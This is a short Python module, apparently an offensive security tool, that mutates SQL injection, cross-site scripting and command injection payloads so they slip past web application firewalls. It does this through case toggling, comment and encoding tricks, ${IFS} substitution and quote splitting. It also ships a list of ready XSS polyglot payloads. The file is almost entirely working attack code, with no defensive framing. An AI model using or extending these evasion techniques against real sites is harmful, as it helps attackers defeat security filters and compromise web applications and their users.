import urllib.parse
import random
import base64

class VenomMutation:
    """
    Protocol Venom: Advanced Payload Mutation Engine for WAF Evasion.
    """
    
    @staticmethod
    def mutate_sql(payload):
        """
        Mutates SQL Injection payloads to bypass WAFs.
        """
        techniques = [
            lambda p: p.replace(" ", "/**/"), # Comment obfuscation
            lambda p: p.replace("SELECT", "SeLeCt").replace("UNION", "UnIoN"), # Case toggling
            lambda p: p.replace(" ", "%20"), # URL Encoding
            lambda p: p.replace("=", " LIKE "), # Operator replacement
            lambda p: f"/*!{p}*/", # MySQL Version Comment
            lambda p: urllib.parse.quote(p), # Full URL Encode
        ]
        # Apply 1-2 random techniques
        mutation = payload
        for _ in range(random.randint(1, 2)):
            mutation = random.choice(techniques)(mutation)
        return mutation

    @staticmethod
    def mutate_xss(payload):
        """
        Mutates XSS payloads.
        """
        techniques = [
            lambda p: p.replace("<script>", "<sCrIpT>"), # Case
            lambda p: p.replace("<script>", "<script >"), # Space injection
            lambda p: p.replace("alert(1)", "prompt(1)"), # Function rotation
            lambda p: p.replace("alert(1)", "confirm`1`"), # Backtick execution
            lambda p: "".join([f"&#x{ord(c):x};" for c in p]), # Hex Entity Encoding
            lambda p: p.replace("javascript:", "java\tscript:"), # Tab obfuscation
        ]
        mutation = payload
        for _ in range(random.randint(1, 2)):
            mutation = random.choice(techniques)(mutation)
        return mutation
        
    @staticmethod
    def mutate_cmd(payload):
        """
        Mutates Command Injection payloads.
        """
        techniques = [
            lambda p: p.replace("cat", "c''at"), # Quote splitting
            lambda p: p.replace(" ", "${IFS}"), # IFS Replacement
            lambda p: p.replace("whoami", r"w\ho\ami"), # Backslash splitting
            lambda p: base64.b64encode(p.encode()).decode(), # Base64 (requires decoder on target, situational)
        ]
        # Command mutation is risky, stick to simple ones
        return random.choice(techniques)(payload)

    @staticmethod
    def get_polyglots():
        """
        Returns a list of high-efficacy Polyglot payloads.
        """
        return [
            "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e",
            "\"><script>alert(1)</script>",
            "';alert(1)//",
            "<IMG SRC=j&#X41vascript:alert(1)>",
            "'\";alert(1)//",
        ]
